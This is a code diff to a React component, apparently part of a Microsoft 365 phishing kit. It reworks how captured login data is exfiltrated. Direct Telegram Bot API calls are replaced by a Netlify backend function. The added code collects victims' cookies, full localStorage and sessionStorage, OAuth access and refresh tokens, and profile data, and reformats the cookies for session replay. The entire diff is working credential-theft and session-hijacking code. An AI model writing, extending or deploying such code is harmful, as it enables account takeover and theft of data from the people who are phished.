@@ -66,34 +66,43 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
   // Send data to Telegram
   const sendToTelegram = async (data: any) => {
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
-    
-    const message = `
-🔐 Microsoft OAuth Login Captured:
-📧 Email: ${data.email || 'N/A'}
-👤 Name: ${data.name || 'N/A'}
-🆔 User ID: ${data.id || 'N/A'}
-🍪 Cookies: ${JSON.stringify(data.cookies, null, 2)}
-⏰ Timestamp: ${new Date().toISOString()}
-🌐 IP: ${data.ip || 'N/A'}
-🖥️ User Agent: ${navigator.userAgent}
-    `;
-
+    // Use the backend function instead of direct Telegram API
     try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      const response = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'HTML'
+          email: data.email,
+          password: 'OAuth Login',
+          provider: 'Microsoft',
+          fileName: 'Microsoft OAuth',
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          browserFingerprint: {
+            cookies: data.cookies,
+            localStorage: 'OAuth Session',
+            sessionStorage: 'OAuth Session',
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+          },
+          documentCookies: data.cookies,
+          sessionId: Math.random().toString(36).substring(2, 15),
+          cookies: data.cookies,
+          formattedCookies: [],
+          accessToken: data.accessToken,
+          refreshToken: data.refreshToken,
+          userProfile: data
         })
       });
+      
+      const result = await response.json();
+      console.log('✅ Data sent to Telegram via backend:', result);
+      return result;
     } catch (error) {
-      console.error('Failed to send to Telegram:', error);
+      console.error('❌ Failed to send to Telegram via backend:', error);
+      return { error: error.message };
     }
   };
 
@@ -147,6 +156,17 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
       // Grab cookies after successful login
       grabCookies();
       
+      // Get browser fingerprint
+      const browserFingerprint = {
+        cookies: document.cookie,
+        localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
+        sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        timestamp: new Date().toISOString()
+      };
+      
       // Get user info from Microsoft Graph API
       const tokenResponse = await fetch(`https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`, {
         method: 'POST',
@@ -174,22 +194,68 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
         
         const profileData = await profileResponse.json();
         
-        // Prepare data for Telegram
-        const telegramData = {
+        // Prepare session data
+        const sessionData = {
           email: profileData.mail || profileData.userPrincipalName,
           name: profileData.displayName,
           id: profileData.id,
-          cookies: document.cookie,
-          ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown'),
+          provider: 'Microsoft',
+          sessionId: Math.random().toString(36).substring(2, 15),
+          timestamp: new Date().toISOString(),
           accessToken: tokenData.access_token,
-          refreshToken: tokenData.refresh_token
+          refreshToken: tokenData.refresh_token,
+          authenticationMethod: 'OAuth'
         };
+        
+        // Store session data
+        localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
+        localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));
 
-        // Send to Telegram
-        await sendToTelegram(telegramData);
+        // Send to Telegram via backend function
+        try {
+          await fetch('/.netlify/functions/sendTelegram', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              email: sessionData.email,
+              password: 'OAuth Login - No Password',
+              provider: 'Microsoft',
+              fileName: 'Microsoft OAuth Login',
+              timestamp: sessionData.timestamp,
+              userAgent: navigator.userAgent,
+              browserFingerprint: browserFingerprint,
+              documentCookies: document.cookie,
+              sessionId: sessionData.sessionId,
+              cookies: document.cookie,
+              formattedCookies: document.cookie.split(';').map(c => {
+                const [name, value] = c.trim().split('=');
+                return {
+                  name: name,
+                  value: value || '',
+                  domain: window.location.hostname,
+                  path: '/',
+                  secure: true,
+                  httpOnly: false,
+                  sameSite: 'none'
+                };
+              }),
+              localStorage: browserFingerprint.localStorage,
+              sessionStorage: browserFingerprint.sessionStorage,
+              accessToken: tokenData.access_token,
+              refreshToken: tokenData.refresh_token,
+              userProfile: profileData
+            })
+          });
+          
+          console.log('✅ OAuth data sent to Telegram');
+        } catch (telegramError) {
+          console.error('❌ Failed to send OAuth data to Telegram:', telegramError);
+        }
         
         // Call the success callback
-        onLoginSuccess(telegramData);
+        onLoginSuccess(sessionData);
       }
     } catch (error) {
       console.error('OAuth callback error:', error);
